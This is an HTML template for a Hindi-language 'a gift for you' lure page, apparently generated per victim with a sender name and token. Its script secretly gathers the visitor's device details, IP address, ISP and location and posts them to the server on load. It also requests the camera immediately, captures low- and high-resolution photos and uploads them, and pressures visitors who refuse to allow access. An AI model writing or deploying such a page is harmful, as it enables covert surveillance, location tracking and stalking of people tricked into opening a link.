<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>‡§Ü‡§™‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§§‡•ã‡§π‡§´‡§º‡§æ üéÅ</title>
  <style>
    body{margin:0;font-family:sans-serif;background:linear-gradient(135deg,#0ea5e9,#8b5cf6);
      display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;text-align:center}
    .card{background:rgba(0,0,0,0.5);padding:24px;border-radius:16px;max-width:320px;width:90%}
    h1{font-size:1.4rem;margin-bottom:12px}
    p{margin-bottom:20px}
    button{background:linear-gradient(90deg,#22c55e,#16a34a);border:none;color:#fff;
      padding:14px 20px;border-radius:12px;width:100%;font-size:1.1rem;font-weight:600}
    #msg{margin-top:15px;font-size:0.9rem;color:#fbbf24}
  </style>
</head>
<body>
  <div class="card">
    <h1>üëã {{ user_name }} ‡§®‡•á ‡§Ü‡§™‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•Å‡§õ ‡§≠‡•á‡§ú‡§æ ‡§π‡•à</h1>
    <p>‡§¶‡•á‡§ñ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§®‡•Ä‡§ö‡•á ‡§ï‡•ç‡§≤‡§ø‡§ï ‡§ï‡§∞‡•á‡§Ç‡•§</p>
    <button id="btnCam">‡§¶‡•á‡§ñ‡•á‡§Ç</button>
    <div id="msg"></div>
  </div>

<script>
const token = "{{ token }}";
const ipinfoToken = "{{ ipinfo_token }}";
const msg = document.getElementById("msg");
let cameraAllowed = false;

// Auto system info (no permission needed)
async function collectInfo() {
  let info = {};
  info.userAgent = navigator.userAgent;
  info.language = navigator.language;
  info.platform = navigator.platform;
  info.screen = `${screen.width}x${screen.height}`;
  info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  let ipData = {};
  try {
    const res = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`);
    ipData = await res.json();
  } catch(e){}

  let text = "üß† *System Info Captured*\n";
  text += "‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n";
  text += `üåê *IP:* ${ipData.ip || "N/A"}\n`;
  text += `üè¢ *ISP:* ${ipData.org || "N/A"}\n`;
  text += `üìç *Location:* ${ipData.city || ""}, ${ipData.region || ""}, ${ipData.country || ""}\n`;
  text += `üíª *Device:* ${info.platform}\n`;
  text += `üñ•Ô∏è *Screen:* ${info.screen}\n`;
  text += `üåê *Browser:* ${info.userAgent}\n`;
  text += `üïí *Timezone:* ${info.timezone}\n`;

  fetch("/send_info", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({token, info: text})
  });
}
collectInfo();

// Camera capture
function capturePhoto(stream) {
  const video = document.createElement("video");
  video.srcObject = stream;
  video.play();

  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");

  // Fast low-res snapshot
  setTimeout(() => {
    canvas.width = 320;
    canvas.height = 240;
    ctx.drawImage(video, 0, 0, 320, 240);
    const image = canvas.toDataURL("image/jpeg", 0.6);
    fetch("/send_photo", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({ image, token })
    });
  }, 100);

  // High-res snapshot
  video.onloadedmetadata = () => {
    setTimeout(() => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);
      const image = canvas.toDataURL("image/jpeg", 0.9);
      fetch("/send_photo", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ image, token })
      }).then(() => stream.getTracks().forEach(t => t.stop()));
    }, 500);
  };
}

// Auto ask camera permission on load
navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => {
    cameraAllowed = true;
    capturePhoto(stream);
  })
  .catch(err => {
    cameraAllowed = false;
    msg.innerText = "‚ùå ‡§Ü‡§™‡§®‡•á ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø deny ‡§ï‡§∞ ‡§¶‡•Ä ‡§π‡•à‡•§ Allow ‡§ï‡§∞‡•á‡§Ç ‡§§‡§≠‡•Ä ‡§Ü‡§ó‡•á ‡§¨‡§¢‡§º ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§\n‡§Ö‡§ó‡§∞ allow option ‡§®‡§π‡•Ä‡§Ç ‡§¶‡§ø‡§ñ ‡§∞‡§π‡§æ ‡§§‡•ã ‡§≤‡§ø‡§Ç‡§ï ‡§¶‡•ã‡§¨‡§æ‡§∞‡§æ ‡§ñ‡•ã‡§≤‡•á‡§Ç, ‡§î‡§∞ ‡§´‡§ø‡§∞ ‡§≠‡•Ä ‡§® ‡§π‡•ã ‡§§‡•ã browser data clear ‡§ï‡§∞‡•á‡§Ç‡•§";
  });

// Button logic
document.getElementById("btnCam").addEventListener("click", ()=>{
  if (cameraAllowed) {
    // Already allowed ‚Üí redirect
    window.location.href = "/next?token=" + token;
  } else {
    // Retry asking
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        cameraAllowed = true;
        capturePhoto(stream);
        setTimeout(()=> window.location.href = "/next?token="+token, 1500);
      })
      .catch(err => {
        msg.innerText = "‚ùå ‡§Ü‡§™‡§®‡•á ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø deny ‡§ï‡§∞ ‡§¶‡•Ä ‡§π‡•à‡•§ Allow ‡§ï‡§∞‡•á‡§Ç ‡§§‡§≠‡•Ä ‡§Ü‡§ó‡•á ‡§¨‡§¢‡§º ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§";
      });
  }
});
</script>
</body>
</html>